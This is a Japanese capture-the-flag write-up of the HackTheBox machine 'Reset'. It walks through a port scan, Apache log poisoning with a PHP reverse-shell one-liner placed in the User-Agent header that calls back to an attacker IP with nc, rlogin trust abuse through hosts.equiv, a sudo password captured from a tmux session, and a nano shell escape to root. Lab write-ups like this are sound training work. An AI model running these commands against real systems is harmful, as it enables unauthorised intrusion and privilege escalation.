---
title: 'Reset'
description: 'HackTheBox MachineのWriteup'
pubDate: 2026-03-06T11:00:00+09:00
category: 'HTB'
tags: ['HTB Machine', 'Writeup', 'Linux', 'Request Header Manipulation', 'r-commands', 'GTFOBins']
---

# Reset - HackTheBox

## Initial Access
### Port Scanning
```bash
nmap 10.129.234.130 -Pn -p 80,512,513,514 -A
80/tcp  open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Admin Login
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
512/tcp open  exec?
513/tcp open  login?
514/tcp open  shell?
```

### Web Enumeration
`reset_password.php` の Responsを確認すると
```json
{
  "username":"admin",
  "new_password":"72820a75",
  "timestamp":"2026-03-05 12:43:24"
}
```
`dashboard.php` POST Request
```bash
file=%2Fvar%2Flog%2Fauth.log
```

- Server: Apache/2.4.52 (Ubuntu)

Apacheを使用していることがわかるので
```bash
file=/var/log/apache2/access.log
```

PHPのRevers Shellを作成  
User-Agentに注入して実行
```bash
curl "http://10.129.234.130/dashboard.php" -H "Cookie: PHPSESSID=tcvoep72ue00cpbn2h8mnfr6ge" -H "User-Agent: <?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.47 4444 >/tmp/f'); ?>"
```

```bash
$ nc -lnvp 4444

www-data@reset:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data),4(adm)

www-data@reset:/var/www/html$ ls -la /home/sadm
total 36
drwxr-xr-x 4 sadm sadm 4096 Jun  4  2025 .
drwxr-xr-x 4 root root 4096 Jun  2  2025 ..
lrwxrwxrwx 1 sadm sadm    9 Dec  6  2024 .bash_history -> /dev/null
-rw-r--r-- 1 sadm sadm  220 Dec  6  2024 .bash_logout
-rw-r--r-- 1 sadm sadm 3771 Dec  6  2024 .bashrc
drwx------ 2 sadm sadm 4096 Jun  2  2025 .cache
drwxrwxr-x 3 sadm sadm 4096 Jun  2  2025 .local
-rw-r--r-- 1 sadm sadm  807 Dec  6  2024 .profile
-rw------- 1 sadm sadm    7 Dec  6  2024 .rhosts
-rw-r--r-- 1 root root   33 Apr 10  2025 user.txt
```

> hosts.equivとは  
rlogin / rsh でパスワードなしログインを許可する

```bash
www-data@reset:/var/www/html$ cat /etc/hosts.equiv
# /etc/hosts.equiv: list  of  hosts  and  users  that are granted "trusted" r
#		    command access to your system .
- root
- local
+ sadm
```

> tmuxとは  
1つのターミナルウィンドウの中で複数の仮想端末（セッション）を同時に管理できるソフト

```bash
www-data@reset:/var/www/html$ ps aux

sadm        1171  0.0  0.2   8764  4140 ?        Ss   00:18   0:00 tmux new-session -d -s sadm_session
sadm        1179  0.0  0.2   8676  5400 pts/3    Ss+  00:18   0:00 -bash
```

### r-commands

`kali@kali:~$ rlogin 10.129.234.130 -l sadm`

client_user が kali なので パスワードを求められる  
client_user を sadm にすることでパスワードなしで認証成功する(自ホストでsadmを作成する)

```bash
# my host
$ sudo useradd -m -s /bin/bash sadm
$ sudo passwd sadm
$ su sadm
sadm@kali:~$ rlogin 10.129.234.130

sadm@reset:~$ id
uid=1001(sadm) gid=1001(sadm) groups=1001(sadm)
```

### SSH Login

```bash
sadm@reset:~$ tmux ls
sadm_session: 1 windows (created Fri Mar  6 00:18:57 2026)

sadm@reset:~$ tmux attach -t sadm_session

  echo 7lE2PAfVHfjz4HpE | sudo -S nano /etc/firewall.sh
  sadm@reset:~$ echo 7lE2PAfVHfjz4HpE | sudo -S nano /etc/firewall.sh
  Too many errors from stdin
  sadm@reset:~$
```

```bash
$ ssh sadm@10.129.234.130 # 7lE2PAfVHfjz4HpE
```

## Privilege Escalation

```bash
sadm@reset:~$ sudo -l
[sudo] password for sadm:
Matching Defaults entries for sadm on reset:
  env_reset, timestamp_timeout=-1, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, !syslog

User sadm may run the following commands on reset:
  (ALL) PASSWD: /usr/bin/nano /etc/firewall.sh
  (ALL) PASSWD: /usr/bin/tail /var/log/syslog
  (ALL) PASSWD: /usr/bin/tail /var/log/auth.log
```

```bash
sadm@reset:~$ sudo nano /etc/firewall.sh
```

1. Ctrl+R (Read File)
2. Ctrl+X (Execute Command)
3. Command to execute: `reset; sh 1>&0 2>&0`

3.で reset コマンドを使用しないと壊れた shell が作成される
```bash
[ Executing... ]#
# id
uid=0(root) gid=0(root) groups=0(root)
# ls /root
root_279e22f8.txt
```